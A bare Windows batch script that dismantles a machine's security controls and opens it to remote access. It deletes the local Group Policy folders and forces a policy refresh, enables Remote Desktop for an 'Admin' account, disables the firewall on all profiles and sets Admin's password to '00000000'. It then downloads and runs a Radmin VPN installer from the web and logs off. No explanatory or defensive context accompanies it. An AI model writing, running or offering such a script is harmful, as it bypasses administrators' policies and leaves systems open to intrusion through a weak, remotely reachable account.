@echo off
powershell -Command "Remove-Item -Recurse -Force C:\Windows\System32\GroupPolicy"
powershell -Command "Remove-Item -Recurse -Force C:\Windows\System32\GroupPolicyUsers"
gpupdate /force
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net localgroup "Remote Desktop Users" Admin /add
netsh advfirewall set allprofiles state off
net user Admin 00000000
powershell -Command "Invoke-WebRequest 'https://download.radmin-vpn.com/download/files/Radmin_VPN_1.4.4642.1.exe' -OutFile 'C:\radmin.exe'"
start "" "C:\radmin.exe"
pause
shutdown -l
